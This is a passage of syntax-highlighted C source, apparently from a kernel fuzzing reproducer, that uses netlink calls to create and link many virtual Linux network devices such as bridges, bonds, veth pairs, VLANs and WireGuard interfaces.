<span class="w">      </span><span class="p">{</span><span class="s">&quot;ip6gretap&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ip6gretap0&quot;</span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;bridge&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bridge0&quot;</span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;vcan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vcan0&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;bond&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bond0&quot;</span><span class="p">},</span><span class="w">           </span><span class="p">{</span><span class="s">&quot;team&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;team0&quot;</span><span class="p">},</span><span class="w">     </span><span class="p">{</span><span class="s">&quot;dummy&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;dummy0&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;nlmon&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;nlmon0&quot;</span><span class="p">},</span><span class="w">         </span><span class="p">{</span><span class="s">&quot;caif&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;caif0&quot;</span><span class="p">},</span><span class="w">     </span><span class="p">{</span><span class="s">&quot;batadv&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;batadv0&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;vxcan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vxcan1&quot;</span><span class="p">},</span><span class="w">         </span><span class="p">{</span><span class="s">&quot;veth&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span><span class="w">           </span><span class="p">{</span><span class="s">&quot;wireguard&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;wg0&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;wireguard&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;wg1&quot;</span><span class="p">},</span><span class="w">        </span><span class="p">{</span><span class="s">&quot;wireguard&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;wg2&quot;</span><span class="p">},</span>
<span class="w">  </span><span class="p">};</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">devmasters</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;bridge&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bond&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;team&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;batadv&quot;</span><span class="p">};</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">macsize</span><span class="p">;</span>
<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="n">noipv6</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">devices</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;lo&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;sit0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;bridge0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;vcan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;tunl0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;gre0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;gretap0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ip_vti0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ip6_vti0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ip6tnl0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ip6gre0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ip6gretap0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;erspan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;bond0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;team0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_to_bridge&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_to_bridge&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_to_bond&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_to_bond&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_to_team&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_to_team&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_to_hsr&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_to_hsr&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;hsr0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;dummy0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;nlmon0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;vxcan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;vxcan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;caif0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;batadv0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="n">netdevsim</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;xfrm0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_virt_wifi&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_virt_wifi&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;virt_wifi0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;vlan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;vlan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;macvlan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;macvlan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ipvlan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;ipvlan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_macvtap&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_macvtap&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;macvtap0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;macsec0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth0_to_batadv&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;veth1_to_batadv&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;batadv_slave_0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;batadv_slave_1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;geneve0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;geneve1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ETH_ALEN</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;wg0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;wg1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;wg2&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span>
<span class="w">  </span><span class="p">};</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_ROUTE</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">devtypes</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">devtypes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">    </span><span class="n">netlink_add_device</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">devtypes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">devtypes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">dev</span><span class="p">);</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">devmasters</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">devmasters</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">master</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span><span class="w"> </span><span class="n">slave0</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span><span class="w"> </span><span class="n">veth0</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span><span class="w"> </span><span class="n">slave1</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span><span class="w"> </span><span class="n">veth1</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">slave0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s_slave_0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">devmasters</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">veth0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_to_%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">devmasters</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">slave0</span><span class="p">,</span><span class="w"> </span><span class="n">veth0</span><span class="p">);</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">slave1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s_slave_1&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">devmasters</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">veth1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_to_%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">devmasters</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">slave1</span><span class="p">,</span><span class="w"> </span><span class="n">veth1</span><span class="p">);</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">master</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s0&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">devmasters</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">slave0</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">,</span><span class="w"> </span><span class="n">master</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">slave1</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">,</span><span class="w"> </span><span class="n">master</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">netlink_add_xfrm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;xfrm0&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bridge_slave_0&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bridge_slave_1&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr_slave_0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_to_hsr&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr_slave_1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_to_hsr&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_hsr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr_slave_0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr_slave_1&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr_slave_0&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr_slave_1&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_virt_wifi&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_virt_wifi&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_linked</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;virt_wifi&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;virt_wifi0&quot;</span><span class="p">,</span>
<span class="w">                     </span><span class="s">&quot;veth1_virt_wifi&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_vlan&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_vlan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vlan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_8021Q</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_add_vlan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vlan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_8021AD</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_add_macvlan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macvlan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_vlan&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_macvlan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macvlan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_vlan&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_ipvlan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ipvlan0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IPVLAN_MODE_L2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_ipvlan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ipvlan1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IPVLAN_MODE_L3S</span><span class="p">,</span>
<span class="w">                     </span><span class="n">IPVLAN_F_VEPA</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_veth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_macvtap&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_macvtap&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_linked</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macvtap&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macvtap0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth0_macvtap&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_linked</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macsec&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macsec0&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth1_macvtap&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">addr</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">DEV_IPV4</span><span class="p">,</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">in_addr</span><span class="w"> </span><span class="n">geneve_addr4</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">geneve_addr4</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">in6_addr</span><span class="w"> </span><span class="n">geneve_addr6</span><span class="p">;</span>
